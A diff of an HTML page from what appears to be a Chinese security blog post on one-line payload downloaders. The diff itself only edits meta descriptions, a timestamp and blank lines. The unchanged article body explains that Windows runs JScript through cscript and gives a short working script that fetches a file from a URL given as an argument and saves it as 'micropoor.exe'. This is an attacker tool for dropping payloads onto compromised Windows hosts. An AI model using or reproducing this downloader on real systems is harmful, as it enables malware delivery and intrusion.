@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。 12345678var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript">
+    <meta name="description" content="js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。 12345678var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript.A">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一句话下载payload（持续更新）">
 <meta property="og:url" content="https://godzeo.github.io/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。 12345678var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript">
+<meta property="og:description" content="js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。 12345678var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript.A">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-04-24T05:24:07.000Z">
-<meta property="article:modified_time" content="2020-08-31T15:02:29.971Z">
+<meta property="article:modified_time" content="2020-10-14T01:57:30.942Z">
 <meta property="article:author" content="Zeo">
 <meta property="article:tag" content="WEB安全">
 <meta property="article:tag" content="代码审计">
@@ -164,8 +164,6 @@
 
   <div class="content" itemprop="articleBody">
     <a id="more"></a>
-
-
 
 <p>js一句话下载payload<br>windows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">​</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">​</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;micropoor.exe&quot;);</span><br></pre></td></tr></table></figure>
